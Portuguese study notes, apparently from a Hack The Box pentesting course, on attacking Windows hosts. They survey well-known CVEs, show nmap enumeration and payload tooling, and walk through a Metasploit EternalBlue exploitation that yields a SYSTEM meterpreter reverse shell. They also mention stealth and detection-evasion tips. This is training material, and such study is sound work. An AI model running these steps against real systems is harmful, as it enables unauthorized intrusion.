#### Tabela de vulnerabilidades do Windows
![[Pasted image 20240830092906.png]]
## Exploits proeminentes do Windows
Várias vulnerabilidades no Windows e seus ataques correspondentes são algumas das vulnerabilidades mais exploradas do nosso tempo. Vamos discutir isso por um minuto:

|                  |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| ---------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `MS08-067`       | MS08-067 foi um patch crítico enviado para muitas revisões diferentes do Windows devido a uma falha SMB. Essa falha tornou extremamente fácil a infiltração em um host Windows. Era tão eficiente que o worm Conficker o estava usando para infectar todos os hosts vulneráveis ​​que encontrava. Até o Stuxnet tirou vantagem dessa vulnerabilidade.                                                                                                                                                                                                                                      |
| `Eternal Blue`   | MS17-010 é um exploit vazado no dump Shadow Brokers da NSA. Este exploit foi mais notavelmente usado nos ataques cibernéticos WannaCry ransomware e NotPetya. Este ataque aproveitou uma falha no protocolo SMB v1 permitindo a execução de código. Acredita-se que o EternalBlue tenha infectado mais de 200.000 hosts somente em 2017 e ainda é uma maneira comum de encontrar acesso a um host Windows vulnerável.                                                                                                                                                                      |
| `PrintNightmare` | Uma vulnerabilidade de execução remota de código no Windows Print Spooler. Com credenciais válidas para esse host ou um shell de privilégio baixo, você pode instalar uma impressora, adicionar um driver que roda para você e concede a você acesso de nível de sistema ao host. Essa vulnerabilidade tem devastado empresas em 2021. 0xdf escreveu um post incrível sobre isso [aqui](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html) .                                                                                                                              |
| `BlueKeep`       | CVE 2019-0708 é uma vulnerabilidade no protocolo RDP da Microsoft que permite a Execução Remota de Código. Essa vulnerabilidade aproveitou um canal chamado incorretamente para obter execução de código, afetando todas as revisões do Windows, do Windows 2000 ao Server 2008 R2.                                                                                                                                                                                                                                                                                                        |
| `Sigred`         | O CVE 2020-1350 utilizou uma falha na forma como o DNS lê os registros de recursos SIG. É um pouco mais complicado do que os outros exploits nesta lista, mas se feito corretamente, dará ao invasor privilégios de Domain Admin, pois afetará o servidor DNS do domínio, que geralmente é o Domain Controller primário.                                                                                                                                                                                                                                                                   |
| `SeriousSam`     | O CVE 2021-36924 explora um problema com a maneira como o Windows lida com a permissão na `C:\Windows\system32\config`pasta. Antes de corrigir o problema, usuários não elevados têm acesso ao banco de dados SAM, entre outros arquivos. Este não é um grande problema, pois os arquivos não podem ser acessados ​​enquanto estiverem em uso pelo PC, mas isso se torna perigoso ao olhar para backups de cópia de sombra de volume. Esses mesmos erros de privilégio existem nos arquivos de backup também, permitindo que um invasor leia o banco de dados SAM, despejando credenciais. |
| `Zerologon`      | CVE 2020-1472 é uma vulnerabilidade crítica que explora uma falha criptográfica no Active Directory Netlogon Remote Protocol (MS-NRPC) da Microsoft. Ele permite que os usuários façam logon em servidores usando o NT LAN Manager (NTLM) e até mesmo enviem alterações de conta por meio do protocolo. O ataque pode ser um pouco complexo, mas é trivial de executar, pois um invasor teria que fazer cerca de 256 tentativas de senha de conta de computador antes de encontrar o que precisa. Isso pode acontecer em questão de segundos.                                              |

## Enumerando o Windows e métodos de impressão digital

Para identificar se um host é provavelmente uma máquina Windows, uma maneira comum é observar o valor do **Time To Live (TTL)** ao usar ICMP (como com um comando `ping`). Em hosts Windows, o TTL típico é 128, e um TTL de 32 também pode ser visto. Esses valores podem variar dependendo da distância do host, mas em redes comuns, um TTL de 128 é um forte indicador de que o host é Windows. Para mais precisão, você pode consultar uma tabela que mostra os valores de TTL para diferentes sistemas operacionais.

#### Ping Host
```shell-session
NycolasRamos@htb[/htb]$ ping 192.168.86.39 
```
![[Pasted image 20240830093337.png]]

#### Detecção de SO
```shell-session
NycolasRamos@htb[/htb]$ sudo nmap -v -O 192.168.86.39
```
A opção `-O` pede ao nmap para tentar descobrir o Host que está sendo escaneado e a opção `-v` indica que queremos uma saída mais detalhada. Agora precisamos enumerar os serviços que podemos ver para determinar se temos uma potencial via de exploração.

Para executar o banner grabbing, podemos usar várias ferramentas diferentes. Netcat, Nmap e muitos outros podem executar a enumeração de que precisamos, mas para esta instância, veremos um script Nmap simples chamado `banner.nse`.

Para cada porta que o Nmap vê como ativa, ele tentará se conectar à porta e coletar qualquer informação que puder dela. Na sessão abaixo, o Nmap tentou se conectar a cada porta, mas as únicas portas que retornaram uma resposta foram as portas 902 e 912.

Em um pentest real, você vai querer ser o mais completo possível, certificando-se de ter o conhecimento completo do terreno.

#### Banner Grab para enumerar portas
```shell-session
NycolasRamos@htb[/htb]$ sudo nmap -v 192.168.86.39 --script banner.nse
```

## Arquivos Bats, DLLs e MSI

Ao criar payloads para hosts Windows, você tem várias opções, como DLLs, arquivos em lote, pacotes MSI e scripts do PowerShell. Todos esses tipos de arquivos podem ser executados em um host, permitindo realizar diferentes tarefas. A escolha do tipo de payload deve considerar o mecanismo de entrega que será utilizado, pois isso pode influenciar qual tipo de payload é mais adequado para a situação.

#### Tipos de Payload a considerar

**DLLs**: Uma Dynamic Linking Library (DLL) é um arquivo usado em sistemas Windows para fornecer código e dados que podem ser compartilhados entre vários programas. Como pentester, injetar uma DLL maliciosa ou sequestrar uma biblioteca vulnerável pode permitir a elevação de privilégios ou a superação de Controles de Conta de Usuário (UAC).

**Batch**: Arquivos Batch são scripts DOS com extensão .bat usados para automatizar tarefas no sistema. Eles podem executar comandos como abrir portas ou estabelecer conexões com a máquina atacante, além de realizar etapas básicas de enumeração.

**VBS**: VBScript, baseado no Visual Basic, é uma linguagem de script usada para criar páginas web dinâmicas. Embora desatualizado e desativado em navegadores modernos, ainda é utilizado em ataques de Phishing para enganar usuários e executar código malicioso.

**Arquivos MSI**: Arquivos .MSI são usados pelo Windows Installer para gerenciar a instalação de aplicativos. Como pentester, criar um payload em formato MSI e executá-lo no host pode fornecer acesso elevado, como um shell reverso.

**PowerShell**: PowerShell é tanto um ambiente de shell quanto uma linguagem de script moderna em sistemas Windows. Ele oferece uma variedade de opções para obter shells e executar comandos em um host durante testes de penetração.

## Ferramentas, táticas e procedimentos para geração, transferência e execução de Payload

#### Geração de Payload
A tabela abaixo apresenta algumas de nossas opções. No entanto, esta não é uma lista exaustiva, e novos recursos são lançados diariamente.

|**Recurso**|**Descrição**|
|---|---|
|`MSFVenom & Metasploit-Framework`|[O Source](https://github.com/rapid7/metasploit-framework) MSF é uma ferramenta extremamente versátil para o kit de ferramentas de qualquer pentester. Ele serve como uma maneira de enumerar hosts, gerar payloads, utilizar exploits públicos e personalizados e executar ações de pós-exploração uma vez no host. Pense nisso como um canivete suíço.|
|`Payloads All The Things`|[Fonte](https://github.com/swisskyrepo/PayloadsAllTheThings) Aqui, você pode encontrar muitos recursos diferentes e folhas de dicas para geração de carga útil e metodologia geral.|
|`Mythic C2 Framework`|[Fonte](https://github.com/its-a-feature/Mythic) O framework Mythic C2 é uma opção alternativa ao Metasploit como um framework de comando e controle e caixa de ferramentas para geração de carga útil exclusiva.|
|`Nishang`|[Source](https://github.com/samratashok/nishang) Nishang é uma coleção de frameworks de implantes e scripts Offensive PowerShell. Inclui muitos utilitários que podem ser úteis para qualquer pentester.|
|`Darkarmour`|[Fonte](https://github.com/bats3c/darkarmour) Darkarmour é uma ferramenta para gerar e utilizar binários ofuscados para uso contra hosts Windows.|

#### Transferência e execução de Payload:
A lista abaixo inclui algumas ferramentas e protocolos úteis para uso ao tentar soltar um payload em um alvo.

- `Impacket`: [Impacket](https://github.com/SecureAuthCorp/impacket) é um conjunto de ferramentas embutido em Python que nos fornece uma maneira de interagir com protocolos de rede diretamente. Algumas das ferramentas mais interessantes com as quais nos importamos no Impacket lidam com `psexec`, `smbclient`, `wmi`, Kerberos e a capacidade de criar um servidor SMB.
- [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md) : é um ótimo recurso para encontrar instruções rápidas para ajudar a transferir arquivos entre hosts de forma expedita.
- `SMB`: O **SMB** é um protocolo usado em sistemas Windows para compartilhamento de arquivos e recursos de rede. Como pentesters, podemos explorar esses compartilhamentos, especialmente os administrativos como **C\$** e **admin\$**, para transferir cargas úteis e exfiltrar dados na rede.
- `Remote execution via MSF`:Incorporada em muitos dos módulos de exploração do Metasploit há uma função que criará, preparará e executará as cargas automaticamente.
- `Other Protocols`: Ao olhar para um host, protocolos como FTP, TFTP, HTTP/S e mais podem fornecer uma maneira de fazer upload de arquivos para o host. Enumere e preste atenção às funções que estão abertas e disponíveis para uso.

## Exemplo de Compromisso Passo a passo
1. Enumerar o anfitrião
	Ping, Netcat, varreduras Nmap e até mesmo Metasploit são todas boas opções para começar a enumerar nossas vítimas em potencial.

#### Enumerar o Host
```shell-session
NycolasRamos@htb[/htb]$ nmap -v -A 10.129.201.97
```
Durante a varredura de um host Windows Server 2016, descobrimos que ele não está em um domínio e executa vários serviços. Considerando potenciais caminhos de exploração, podemos explorar o IIS, tentar acesso via SMB usando ferramentas como Impacket, ou até buscar uma vulnerabilidade RCE. O host pode ser vulnerável ao MS17-010 (EternalBlue), já que essa falha afeta sistemas do Windows 2008 ao Server 2016. Para confirmar, podemos usar a verificação auxiliar do Metasploit com o módulo `auxiliary/scanner/smb/smb_ms17_010`.

2. Pesquise e decida sobre um caminho de exploração
	No `msfconsole` pesquise por EternalBlue, ou você pode usar a string na sessão abaixo para usar a verificação. Defina o campo RHOSTS com o endereço IP do alvo e inicie a varredura. Como pode ser visto nas opções do módulo, você pode preencher mais configurações de SMB, mas não é necessário.
	Quando estiver pronto, digite `run`.

#### Determinar um caminho de exploração
```shell-session
msf6 auxiliary(scanner/smb/smb_ms17_010) > use auxiliary/scanner/smb/smb_ms17_010 
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options
```
![[Pasted image 20240830095714.png]]

Agora, podemos ver pelos resultados da verificação que nosso alvo provavelmente é vulnerável ao EternalBlue. Vamos configurar o exploit e o payload agora, e então tentar.

3. Selecione Exploit & Payload e depois Deliver
#### Escolha e configure nosso Exploit e Payload

```shell-session
msf6 > search eternal
```
<pre style="overflow-x:scroll;">
Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   2  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   3  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   4  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
</pre>
Tentaremos primeiro a versão `psexec` desta exploração.

#### Configurar o Exploit e a Carga Útil
```shell-session
msf6 > use 2
```
![[Pasted image 20240830100108.png]]

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > options
```
![[Pasted image 20240830100145.png]]

Certifique-se de definir suas opções de payload corretamente antes de executar o exploit. Neste caso, precisamos garantir que nossos campos `RHOSTS, LHOST, and LPORT` estejam definidos corretamente.

#### Valide Nossas Opções
```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > show options
```
![[Pasted image 20240830100324.png]]
Desta vez, mantivemos a simplicidade e usamos apenas um payload `windows/meterpreter/reverse_tcp`.

4. Execute o ataque e receba um retorno de chamada.
#### Execute nosso ataque
```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > exploit
```
![[Pasted image 20240830100438.png]]

```shell-session
meterpreter > getuid
```
![[Pasted image 20240830100512.png]]
Sucesso! Conseguimos nosso exploit e ganhamos uma sessão de shell. Um shell de nível de `SYSTEM`.

5. Identifique a shell nativa.
#### Identifique nossa concha
```shell-session
meterpreter > shell
```
![[Pasted image 20240830100644.png]]

## CMD-Prompt e Power\[Shell\]s para diversão e lucro.
Temos sorte com hosts Windows de termos não uma, mas duas escolhas de shells para utilizar por padrão. Agora você pode estar se perguntando:

`Qal devo usar ?`

A resposta é simples, aquela que fornece a você a capacidade que você precisa no momento. Compare `cmd`e `PowerShell`por um minuto tenha uma noção do que eles oferecem e quando seria melhor escolher um em vez do outro.

O **CMD** é o shell original do MS-DOS, usado para operações básicas e automação simples com arquivos em lote. O **PowerShell**, desenvolvido para expandir as funcionalidades do CMD, suporta comandos nativos do MS-DOS e novos comandos baseados em .NET, além de permitir a criação de módulos com cmdlets.

PowerShell utiliza objetos .NET para entrada e saída, mantém um registro de comandos e pode enfrentar restrições como Execution Policy e User Account Control (UAC). Em contraste, CMD lida apenas com texto e não registra comandos, o que pode ser útil para operações furtivas. O PowerShell não está disponível em versões anteriores ao Windows 7, como o Windows XP.

**Use `CMD` quando:**
	- Você está em um host mais antigo que pode não incluir o PowerShell.
	- Quando você só precisa de interações/acesso simples ao host.
	- Quando você planeja usar arquivos em lote simples, comandos de rede ou ferramentas nativas do MS-DOS.
	- Quando você acredita que as políticas de execução podem afetar sua capacidade de executar scripts ou outras ações no host.
**Use `PowerShell`quando:**
	- Você está planejando utilizar cmdlets ou outros scripts personalizados.
	- Quando você deseja interagir com objetos .NET em vez de saída de texto.
	- Quando ser furtivo é uma preocupação menor.
	- Se você estiver planejando interagir com serviços e hosts baseados em nuvem.
	- Se seus scripts definirem e usarem Aliases.

## WSL e PowerShell para Linux
O Subsistema Windows para Linux (WSL) oferece um ambiente Linux virtual integrado ao Windows. Recentemente, tem sido usado por malware para rodar binários Python3 e Linux em hosts Windows, muitas vezes junto com PowerShell.

Um ponto importante é que o WSL não é monitorado pelo Firewall do Windows ou pelo Windows Defender, o que o torna um ponto cego para segurança. O PowerShell Core, disponível para Linux, também pode ser usado de forma furtiva para realizar ações semelhantes. Ambos os métodos são avançados e podem evitar mecanismos de detecção tradicionais.






























































